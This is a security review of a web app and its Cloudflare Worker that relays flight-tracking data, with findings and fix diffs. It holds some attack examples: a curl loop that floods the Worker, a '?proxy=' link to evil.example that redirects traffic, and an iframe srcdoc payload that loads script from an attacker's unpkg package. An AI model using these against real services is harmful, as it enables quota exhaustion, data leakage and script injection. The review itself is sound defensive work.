# Security review (Lane S): pre-deploy, 2026-11-04

Scope: `web/` (static app), `worker/` (Cloudflare Worker), `deploy/`. This is a source review. No production service was contacted. I checked the Cloudflare Cache API behaviour against Cloudflare's documentation.
**Result: no Critical or High findings, so no code was changed.** There is 1 Medium and 3 Low findings, plus informational notes. Tests: `node --test web/tests/*.test.mjs` gives 61 pass, 0 fail, 2 skipped (unchanged).

## What holds up (verified)

- **"Media never leaves the device" is true.** I traced every `fetch` in `web/`:
  - The only destinations are:
    - same-origin files: the demo, `data/types.json` and fixtures
    - the Worker: `/adsb/*`, `/v2/point`, `/data/traces`
    - AWS Terrarium DEM tiles
  - Leaflet loads map tiles (Esri, OSM) as images.
  - There is no XHR, `sendBeacon`, WebSocket, EventSource or analytics.
  - Audio stays in `postMessage` to same-origin workers and the AudioWorklet.
  - Project export and the draft hold media *metadata* only: name, size, duration and creation time. They hold no samples.
- **Third-party script:** only Leaflet 1.9.4 from unpkg, pinned, with SRI on both JS and CSS. The hashes match the official Leaflet 1.9.4 values.
- **No `innerHTML`, `eval` or `new Function` in app code.**
  - The DOM helper `h()` uses `createElement`, `setAttribute` and text nodes.
  - Imported project strings (event labels, media name, notes) render as text.
  - Google Maps and Street View links are built from `lat.toFixed(6)`. A non-number from a crafted project makes the call throw, so no URL injection is possible.
  - All `target=_blank` links carry `rel=noopener`.
- **Worker has no SSRF and no path traversal.**
  - `/adsb/range`:
    - `tag` must match a strict regex, and the year is taken from it.
    - `part` must match `^(|a[a-z])$`.
    - `start` and `end` must be safe integers, with a size cap.
  - Live routes are regex-anchored. Lat and lon are rounded and re-serialized. `nm` is clamped to 1–40. The hex in trace paths is checked.
  - R2 keys are built from validated parts only.
  - Upstream hosts are hard-coded. A caller cannot make the Worker fetch an arbitrary URL.
- **No cache poisoning.**
  - Cached bodies are fully determined by the validated parameters.
  - CORS headers are added after `cache.match`, so a cached response never stores an attacker's `Origin`.
- **CSP** (`_headers`):
  - It has no `unsafe-inline` or `unsafe-eval`, and has `object-src 'none'`, `frame-ancestors 'none'` and `form-action 'none'`.
  - The app sets styles only through the CSSOM, which CSP allows. `index.html` has no inline handlers, scripts or `style=` attributes.
  - `connect-src` covers everything the app fetches: self, `s3.amazonaws.com` and the Worker origin.

## Medium

### M1. The Worker is an unthrottled public relay, and its cache does nothing on `workers.dev`, so anyone can exhaust upstream quotas for all users

- **Attacker:** anyone on the internet. No browser or Origin header is needed, because CORS does not restrict non-browser clients.
- **What they do:**
  1. `deploy/README.md` deploys to `*.workers.dev`. On `workers.dev`, Cache API operations have no effect: `cache.put` silently does nothing. Cloudflare says a custom domain or route is required ([Workers Cache API](https://developers.cloudflare.com/workers/runtime-apis/cache/), [R2 Cache API example](https://developers.cloudflare.com/r2/examples/cache-api/)). So every request goes upstream, and the "5 s per 0.05° cell" sharing does not exist.
  2. Even on a custom domain, `/adsb/range` uses `url.toString()` as its cache key. Adding `&x=<random>` forces a cache miss every time. Each roughly 120-byte request makes the Worker download up to 8 MiB from GitHub (`MAX_RANGE_BYTES`).
  3. A loop such as `while :; do curl "$W/v2/point/$RANDOM.0/0/40"; done` (or any rotating set of cells) relays straight to `api.adsb.lol` with no limit.
- **Result:**
  - adsb.lol (which throttles at about 1 req/s and whose terms ask production users to make contact) and GitHub rate-limit or block the Worker's shared egress. Live mode and historical fetches then fail for every user (upstream 429 is passed straight through).
  - On the free plan, the 100k requests per day are used up, and every user gets Cloudflare errors.
  - It is also a free, CORS-enabled mirror of adsb.lol that is billed to you. It is not a data leak.
- **Status:** the cache no-op on `workers.dev` is documented by Cloudflare. The abuse volume needed to trigger upstream bans requires deployment testing.
- **Minimal fix** (worker; the owner should apply it):
```diff
 # wrangler.toml
+routes = [{ pattern = "data.<your-domain>", custom_domain = true }]   # Cache API needs a zone; workers.dev is a no-op
+[[unsafe.bindings]]   # or [[ratelimits]] on current wrangler: per-IP limit, e.g. 60 req / 60 s
+name = "RL"
+type = "ratelimit"
+namespace_id = "1001"
+simple = { limit = 60, period = 60 }
```
```diff
 // index.js, adsbRange: canonical cache key (only validated params)
-  const key = new Request(url.toString(), { method: 'GET' });
+  const key = new Request(`https://cache.local/range/${tag}/${part}/${start}-${end}`, { method: 'GET' });
 // fetch(): before routing
+    if (env.RL) { const { success } = await env.RL.limit({ key: req.headers.get('CF-Connecting-IP') || 'x' }); if (!success) return err(req, env, 429, 'slow down'); }
```
  - Also call `cache.put` inside `ctx.waitUntil(...)`, which needs `fetch(req, env, ctx)`, so that a cancelled client does not drop the cache write.
  - A cheaper alternative to the rate limiter is a Cloudflare WAF rate-limiting rule on the custom domain.

## Low

### L1. A link (`?proxy=`) or an imported project silently replaces the ADS-B proxy URL, and the change persists

- **Where:** `web/ui/app.js:1363` writes `?proxy=` into `P.run.settings.adsbWorker` and autosaves it. `importProject` (`app.js:1294`) keeps `run.settings.adsbWorker` from the file, although `freshProject` (line 80) says *"the ADS-B proxy URL is not project data"*.
- **Scenario:** a victim opens `https://app/?proxy=https://evil.example`, or imports a shared `.overhead.json` that contains `"adsbWorker":"https://evil.example"`.
  - In production, CSP `connect-src` blocks the fetches. The impact is that historical search and live mode stay broken for that browser until the user clears the setting (a persistent self-DoS).
  - The proxy URL setting is still useful for other origins only if `connect-src` is loosened. The CSP is the only thing stopping the search area, time window and live position from leaking to `evil.example`. It is also the only thing stopping attacker tracks from reaching the L2 sink.
- **Fix** (do not trust a proxy URL from the project file; let `?proxy=` apply only to this session):
```diff
 // app.js importProject
-  const obj = Store.normalizeProject(JSON.parse(await file.text()));
+  const obj = Store.normalizeProject(JSON.parse(await file.text()));
+  obj.run.settings.adsbWorker = P.run.settings.adsbWorker || '';   // environment setting, not project data
```
  - For `?proxy=`: ignore it when `OVERHEAD_CONFIG.adsbWorker` is set (production), or ask for confirmation. Also, `exportProject` could drop `run.settings.adsbWorker`.

### L2. HTML sink in the map tooltip, and the CSP allows every package on unpkg

- **Sink:** `web/ui/map-panel.js:117` calls `pl.bindTooltip(\`${t.callsign} · ${t.type} · ${t.category}\`)`. Leaflet writes string content with `innerHTML`.
  - `type` and `callsign` come from adsb.lol data: the live `t` and `flight` fields, and the traces and tiles.
  - They do not come from project files, which do not carry tracks.
  - `flight` is decoded from the 6-bit ADS-B charset. `t` comes from adsb.lol's aircraft database, so injection needs an upstream data compromise or an attacker-chosen proxy (L1, which CSP blocks).
- **Chain:** inline `<img onerror>` is blocked by CSP. But `script-src https://unpkg.com` allows **any npm package** (`unpkg.com/<attacker-pkg>@1.0.0/x.js`). Injected `<iframe srcdoc="<script src=https://unpkg.com/evil@1/x.js></script>">` would inherit the policy and run same-origin. This chain needs browser testing.
- **Fix** (two independent one-liners):
```diff
-      pl.bindTooltip(`${t.callsign?.trim() || t.icao24 || t.id} · ${t.type || '?'} · ${t.category}`, { sticky: true, className: 'map-tip' });
+      const tip = document.createElement('span'); tip.textContent = `${t.callsign?.trim() || t.icao24 || t.id} · ${t.type || '?'} · ${t.category}`;
+      pl.bindTooltip(tip, { sticky: true, className: 'map-tip' });
```
```diff
 # _headers: pin to the exact files (CSP path matching); images stay host-wide
-  script-src 'self' blob: https://unpkg.com; style-src 'self' https://unpkg.com;
+  script-src 'self' blob: https://unpkg.com/leaflet@1.9.4/dist/leaflet.js; style-src 'self' https://unpkg.com/leaflet@1.9.4/dist/leaflet.css;
```
  - A stronger option is to self-host Leaflet in `web/vendor/` and drop unpkg from `script-src` entirely.

### L3. Live mode sends about 11 m of position precision, while the UI says "your rough area"

- **Where:** `web/live/adsb-live.js:96` builds `/v2/point/${lat.toFixed(4)}/${lon.toFixed(4)}/…`. With "use my location", this is the device GPS fix. The Worker rounds to 0.05° only *after* it receives the request.
- **Effect:** the precise position is in the request line and is visible to the operator's Cloudflare logs or analytics if they are enabled. The legal dialog (`index.html:223`) promises "your rough area".
- **Fix:** round on the client to the same grid. This also makes cache keys identical across users.
```diff
-export const pointUrl = (base, lat, lon, nm) => `${base}/v2/point/${lat.toFixed(4)}/${lon.toFixed(4)}/${Math.round(nm)}`;
+const q = (v) => (Math.round(v * 20) / 20).toFixed(2);   // 0.05 deg, same as the Worker
+export const pointUrl = (base, lat, lon, nm) => `${base}/v2/point/${q(lat)}/${q(lon)}/${Math.round(nm)}`;
```
  - Trace-selection math must keep using the precise `center` locally. Only the request URL changes.

## Informational and hardening

- **CORS:** `wrangler.toml` ships `ALLOWED_ORIGINS = "*"`, and `build.mjs` does not rewrite it. The data is public, so the impact is nil. It is not an abuse control either (see M1). Set it as `deploy/README.md` §2 says.
- **Privacy wording:** "only the search area and time window" is accurate, but these also reach third parties:
  - Esri or OSM receive map tile requests for the viewed area.
  - AWS receives DEM tiles for the search region.
  - The Worker receives tile cell plus date.

  The legal dialog could name these recipients.
- **Local storage:** the `localStorage` draft (`overhead.draft.v1`) holds the region, media file name and creation time in plain text. IndexedDB holds only public ADS-B tracks. This is disclosed in the legal dialog, and is fine for a local-only app on a personal device.
- **`script-src blob:`:** needed for the recorder worklet. It is only an escalation path for script that is already running, so acceptable.
- **HSTS:** `includeSubDomains` applies to the custom domain's subdomains. Confirm before you serve the app on an apex domain that has non-HTTPS siblings.
- **Coverage:** this was one review pass, and a repeat pass may find more. The highest-value follow-up is a browser test of the deployed CSP: check for no violations on demo, fetch, run, basemap switch and record, and attempt the L2 srcdoc chain.
